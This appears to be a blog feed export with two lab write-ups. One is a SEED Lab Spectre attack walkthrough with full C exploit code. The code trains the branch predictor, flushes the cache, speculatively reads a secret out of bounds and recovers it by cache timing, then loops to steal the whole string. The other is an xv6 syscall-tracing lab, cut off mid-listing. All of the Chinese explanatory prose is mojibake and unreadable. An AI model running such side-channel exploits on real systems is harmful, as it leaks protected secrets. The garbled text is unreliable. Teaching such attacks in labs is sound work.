buffer[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;; <br><span class="hljs-keyword">char</span>    *secret    = <span class="hljs-string">&quot;Some Secret Value&quot;</span>;   <span class="hljs-comment">// define secret messege</span><br><span class="hljs-keyword">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CACHE_HIT_THRESHOLD (80)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-comment">// Sandbox Function</span><br><span class="hljs-function"><span class="hljs-keyword">uint8_t</span> <span class="hljs-title">restrictedAccess</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;<br>     <span class="hljs-keyword">return</span> buffer[x];<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">flushSideChannel</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> +DELTA]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">reloadSideChannel</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-keyword">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">uint8_t</span> *addr;<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The Secret = %d(%c).\n&quot;</span>,i, i);<br>    &#125;<br>  &#125; <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spectreAttack</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> index_beyond)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">uint8_t</span> s;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> z;<br>  <span class="hljs-comment">// Train the CPU to take the true branch inside restrictedAccess().</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123; <br>      restrictedAccess(i); <br>  &#125;<br>  <span class="hljs-comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span><br>  _mm_clflush(&amp;bound_upper);<br>  _mm_clflush(&amp;bound_lower);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br>  <span class="hljs-keyword">for</span> (z = <span class="hljs-number">0</span>; z &lt; <span class="hljs-number">100</span>; z++)  &#123;   &#125;<br>  <span class="hljs-comment">// Ask restrictedAccess() to return the secret in out-of-order execution. </span><br>  s = restrictedAccess(index_beyond);  <br>  <span class="hljs-built_in">array</span>[s*<span class="hljs-number">4096</span> + DELTA] += <span class="hljs-number">88</span>;  <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  flushSideChannel();<br>  <span class="hljs-keyword">size_t</span> index_beyond = (<span class="hljs-keyword">size_t</span>)(secret - (<span class="hljs-keyword">char</span>*)buffer);  <br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;secret: %p \n&quot;</span>, secret);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buffer: %p \n&quot;</span>, buffer);\<span class="hljs-function">x0A  <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;index of secret (out of bound): %ld \n&quot;</span>, index_beyond)</span></span>;<br>  spectreAttack(index_beyond);<br>  reloadSideChannel();<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230226134812.png"></p><p>è¿è¡Œä¸¤æ¬¡éƒ½å¾—åˆ°äº†ç»“æœï¼Œç§˜å¯†ä¿¡æ¯çš„ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯S</p><h1 id="Improve-the-Attack-Accuracy"><a href="#Improve-the-Attack-Accuracy" class="headerlink" title="Improve the Attack Accuracy"></a>Improve the Attack Accuracy</h1><p>ç”±äºç¼“å­˜ä¸­çš„å™ªå£°çš„å­˜åœ¨ï¼Œæˆ‘ä»¬çš„æ”»å‡»ç»“æœæœ‰å¯èƒ½ä¸å‡†ç¡®</p><ul><li>CPU æœ‰æ—¶ä¼šåœ¨ç¼“å­˜ä¸­åŠ è½½é¢å¤–çš„å€¼ï¼Œä»¥æœŸåœ¨ä»¥åæŸä¸ªæ—¶é—´ç‚¹ä½¿ç”¨å®ƒ</li><li>é˜ˆå€¼ä¸æ˜¯å¾ˆå‡†ç¡®</li></ul><p>ä¸ºäº†æé«˜ç²¾å‡†åº¦ï¼Œå¯ä»¥ä½¿ç”¨ç»Ÿè®¡æŠ€æœ¯ã€‚å…¶æ€æƒ³æ˜¯åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º256çš„å¾—åˆ†æ•°ç»„ï¼Œæ¯ä¸ªå¯èƒ½çš„ç§˜å¯†å€¼å¯¹åº”ä¸€ä¸ªå…ƒç´ ã€‚ç„¶åæˆ‘ä»¬è¿›è¡Œå¤šæ¬¡æ”»å‡»ã€‚æ¯æ¬¡ï¼Œå¦‚æœæˆ‘ä»¬çš„æ”»å‡»ç¨‹åºè¯´ k æ˜¯ç§˜å¯†(è¿™ä¸ªç»“æœå¯èƒ½æ˜¯é”™è¯¯çš„) ï¼Œæˆ‘ä»¬æŠŠ1åŠ åˆ°åˆ†æ•°[ k ]ä¸Šã€‚åœ¨å¤šæ¬¡è¿è¡Œæ”»å‡»ä¹‹åï¼Œæˆ‘ä»¬ä½¿ç”¨å¾—åˆ†æœ€é«˜çš„å€¼ k ä½œä¸ºå¯¹ç§˜å¯†çš„æœ€ç»ˆä¼°è®¡ã€‚è¿™å°†äº§ç”Ÿæ¯”åŸºäºå•æ¬¡è¿è¡Œçš„ä¼°è®¡æ›´å¯é çš„ä¼°è®¡</p><p>å¾ªç¯1000æ¬¡ï¼Œæ¯æ¬¡éƒ½ä¼šæœ‰ä¸€ä¸ªæœ€å¤§hitå€¼å¯¹åº”çš„ç»“æœï¼Œä½¿ç”¨äº†ä¸€ä¸ªå…¨å±€é™æ€æ•°ç»„scoreç»Ÿè®¡è¿™1000æ¬¡å¾ªç¯ä¸­å‡ºç°æœ€å¤šçš„ç»“æœ</p><p>quiz1ï¼š</p><p>You may observe that when running the code above, the one with the highest score is very likely to be<br>scores[0]. Please figure out why, and fix the code above, so the actual secret value (which is not<br>zero) will be printed out</p><p>mainä¸­1000æ¬¡forå¾ªç¯éƒ½ä¼šè°ƒç”¨<code>spectreAttack(index_beyond);</code>è¯­å¥ï¼Œä»è€Œè§¦å‘<code>s = restrictedAccess(index_beyond);</code>è¯­å¥çš„æ‰§è¡Œï¼Œæ­¤æ—¶restrictedAccesså‡½æ•°çš„è¿”å›å€¼å°†ä¼šæ˜¯0ï¼Œè€Œè¿™ä¸ª0å€¼æ˜¯æ²¡æœ‰è¢«tlbåˆ·æ–°çš„</p><p>å¯ä»¥ç›´æ¥å°†score[0]èµ‹å€¼ä¸º0</p><p>quiz2ï¼š</p><p>Line 1 seems useless, but from our experience on SEED Ubuntu 20.04, without this line, the attack<br>will not work. On the SEED Ubuntu 16.04 VM, there is no need for this line. We have not figured out<br>the exact reason yet, so if you can, your instructor will likely give you bonus points. Please run the<br>program with and without this line, and describe your observations.</p><p>æ³¨é‡Šä¹‹åå†16è™šæ‹Ÿæœºä¸­è¿è¡Œæ­£å¸¸</p><h1 id="Steal-the-Entire-Secret-String"><a href="#Steal-the-Entire-Secret-String" class="headerlink" title="Steal the Entire Secret String"></a>Steal the Entire Secret String</h1><p>åŠ ä¸€å±‚å¾ªç¯å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;=<span class="hljs-number">20</span>;j++)<br>&#123;<br>  flushSideChannel();<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>; i++) scores[i]=<span class="hljs-number">0</span>; <br>  <br>  <span class="hljs-keyword">size_t</span> index_beyond = (<span class="hljs-keyword">size_t</span>)(secret - (<span class="hljs-keyword">char</span>*)buffer);<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*****\n&quot;</span>);  <span class="hljs-comment">// This seemly &quot;useless&quot; line is necessary for the attack to succeed</span><br>    spectreAttack(index_beyond);<br>    usleep(<span class="hljs-number">10</span>);<br>    reloadSideChannelImproved();<br>  &#125;<br><br>  <span class="hljs-keyword">int</span> max = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    <span class="hljs-keyword">if</span>(scores[max] &lt; scores[i]) max = i;<br>  &#125;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Reading secret value at index %ld\n&quot;</span>, index_beyond);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret value is %d(%c)\n&quot;</span>, max, max);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LaPhilosophie/seedlab/main/Spectre%20Attack%20Lab/image/image-20230226145129259.png" alt="image-20230226145129259"></p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-6.S081ï¼šLab2 syscall System calls</title>
    <link href="/p/9fed20a3/"/>
    <url>/p/9fed20a3/</url>
    
    <content type="html"><![CDATA[<blockquote><p><del>å›½ç§‘å¤§ç†å¡˜ä¸çœŸï¼Œç”µå­çƒŸä¸“å–</del></p></blockquote><h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><blockquote><p>å»ºè®®å¬è¯¾+ç†Ÿè¯»xv6æ‰‹å†Œï¼Œå¹¶ç†è§£æ¸…æ¥šlabè¦æ±‚</p></blockquote><p>å…ˆåˆ‡æ¢åˆ°syscallåˆ†æ”¯ï¼Œå¹¶åœ¨sh.cä¸­åŠ å…¥ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·åšæ˜¯ä¸ºäº†é˜²æ­¢æŠ¥é€’å½’é”™</p><p>è¿™ä¸ªå®éªŒè¦æ±‚æˆ‘ä»¬æ·»åŠ ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆææ¸…æ¥šriscvæ¶æ„çš„ç³»ç»Ÿè°ƒç”¨æµç¨‹</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/QQ%E6%88%AA%E5%9B%BE20230302004808.png"></p><p>ç”¨æˆ·æ‰§è¡Œtraceå‘½ä»¤ - &gt; ecall <code>&lt;SYS_trace&gt;</code>  - &gt; è§¦å‘trap - &gt; è°ƒç”¨sys_trace</p><p>æ¥è‡ªç”¨æˆ·ç©ºé—´çš„ç³»ç»Ÿè°ƒç”¨ã€ä¸­æ–­ã€å¼‚å¸¸éƒ½å¯ä»¥å¼•å‘trapï¼Œæ¥è‡ªç”¨æˆ·ç©ºé—´çš„trapçš„å¤„ç†è·¯å¾„æ˜¯ï¼š</p><ul><li>uservec(kernel/trampoline.S:16)</li><li>usertrap(kernel/trap.c:37)</li><li>usertrapret(kernel/trap.c:90) è¿”å›æ—¶</li><li>userret(kernel/trampoline.S:16)</li></ul><p>è¯¦ç»†çš„å†…å®¹è§xv6æ–‡æ¡£</p><h1 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h1><p>ä¸ºäº†æ·»åŠ traceç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬éœ€è¦ï¼š</p><ul><li>åœ¨Makefileä¸­æ·»åŠ $U/_traceï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥ç¼–è¯‘å‡ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»è€Œåœ¨ç”¨æˆ·å‘½ä»¤è¡Œä¸­è°ƒç”¨traceå‘½ä»¤</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs makefile">UPROGS=\<br>$U/_cat\<br>$U/_echo\<br>$U/_forktest\<br>$U/_grep\<br>$U/_init\<br>$U/_kill\<br>$U/_ln\<br>$U/_ls\<br>$U/_mkdir\<br>$U/_rm\<br>$U/_sh\<br>$U/_stressfs\<br>$U/_usertests\<br>$U/_grind\<br>$U/_wc\<br>$U/_zombie\<br>$U/_trace<br></code></pre></td></tr></table></figure><ul><li>å°†traceç³»ç»Ÿè°ƒç”¨çš„åŸå‹æ·»åŠ åˆ° <code>user/user.h</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">trace</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>traceçš„stubæ·»åŠ åˆ° <code>user/usys.pl</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">entry(<span class="hljs-string">&quot;trace&quot;</span>);<br></code></pre></td></tr></table></figure><p>usys.plæ–‡ä»¶ä¼šç”Ÿæˆ<em>usys.S</em>æ–‡ä»¶ï¼Œå½¢å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/syscall.h&quot;</span></span><br>.global trace<br>trace:<br> li a7, SYS_trace<br> ecall<br> ret<br></code></pre></td></tr></table></figure><ul><li>åœ¨syscall.hä¸­æ·»åŠ traceçš„ç³»ç»Ÿè°ƒç”¨å·</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_trace  22</span><br></code></pre></td></tr></table></figure><ul><li>åœ¨syscall.cä¸­æ·»åŠ </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_trace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">uint64</span> <span class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>= &#123;<br>.....<br><br>[SYS_trace]   sys_trace,<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>åœ¨proc.hçš„procç»“æ„ä½“ä¸­æ·»åŠ å­—æ®µmask</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <br>  <span class="hljs-keyword">int</span> mask;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>åœ¨sysproc.cä¸­æ·»åŠ sys_traceï¼Œç…§çŒ«ç”»è™ï¼Œå¯ä»¥å‚è€ƒforkçš„å®ç°ã€‚å…¶ä¸­argintè·å–traceçš„å‚æ•°ï¼Œä¹Ÿå³æ˜¯maskã€‚å°†å½“å‰è¿›ç¨‹çš„maskå­—æ®µè®¾ç½®ä¸ºè¦è¿½è¸ªçš„å‚æ•°</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_trace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> mask;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;mask) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//è·å–traceçš„å‚æ•°ï¼šmask</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>myproc()-&gt;mask=mask;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä¿®æ”¹ fork ()(å‚è§ kernel/proc.c) ï¼Œè·Ÿè¸ªæ©ç ä»çˆ¶è¿›ç¨‹å¤åˆ¶åˆ°å­è¿›ç¨‹</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Create a new process, copying the parent.</span><br><span class="hljs-comment">// Sets up child kernel stack to return as if from fork() system call.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i, pid;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">np</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  <span class="hljs-comment">// Allocate process.</span><br>  <span class="hljs-keyword">if</span>((np = allocproc()) == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Copy user memory from parent to child.</span><br>  <span class="hljs-keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="hljs-number">0</span>)&#123;<br>    freeproc(np);<br>    release(&amp;np-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  np-&gt;sz = p-&gt;sz;<br><br>  np-&gt;parent = p;<br><br>  <span class="hljs-comment">// copy saved user registers.</span><br>  *(np-&gt;trapframe) = *(p-&gt;trapframe);<br><br>  <span class="hljs-comment">// Cause fork to return 0 in the child.</span><br>  np-&gt;trapframe-&gt;a0 = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">// increment reference counts on open file descriptors.</span><br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; NOFILE; i++)<br>    <span class="hljs-keyword">if</span>(p-&gt;ofile[i])<br>      np-&gt;ofile[i] = filedup(p-&gt;ofile[i]);<br>  np-&gt;cwd = idup(p-&gt;cwd);<br><br>  safestrcpy(np-&gt;name, p-&gt;name, <span class="hljs-keyword">sizeof</span>(p-&gt;name));<br><br>  pid = np-&gt;pid;<br><br>  np-&gt;state = RUNNABLE;<br><br>  release(&amp;np-&gt;lock);<br><br>  np-&gt;mask=p-&gt;mask;<span class="hljs-comment">//ç»™å­è¿›ç¨‹çš„maskèµ‹å€¼</span><br><br>  <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ·»åŠ è¦ç´¢å¼•åˆ°çš„ç³»ç»Ÿè°ƒç”¨åç§°æ•°ç»„</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span>  *syscall_name[] = &#123;<br>  <span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;fork&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>, <span class="hljs-string">&quot;wait&quot;</span>, <span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>,<br>  <span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;fstat&quot;</span>, <span class="hljs-string">&quot;chdir&quot;</span>, <span class="hljs-string">&quot;dup&quot;</span>, <span class="hljs-string">&quot;getpid&quot;</span>, <span class="hljs-string">&quot;sbrk&quot;</span>, <span class="hljs-string">&quot;sleep&quot;</span>,<br>  <span class="hljs-string">&quot;uptime&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>, <span class="hljs-string">&quot;write&quot;</span>, <span class="hljs-string">&quot;mknod&quot;</span>, <span class="hljs-string">&quot;unlink&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-string">&quot;mkdir&quot;</span>,<span class="hljs-string">&quot;close&quot;</span>,<span class="hljs-string">&quot;trace&quot;</span>,<span class="hljs-string">&quot;sysinfo&quot;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>ä¿®æ”¹ kernel/syscall.c ä¸­çš„ syscall ()å‡½æ•°ä»¥æ‰“å°è·Ÿè¸ªè¾“å‡º</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 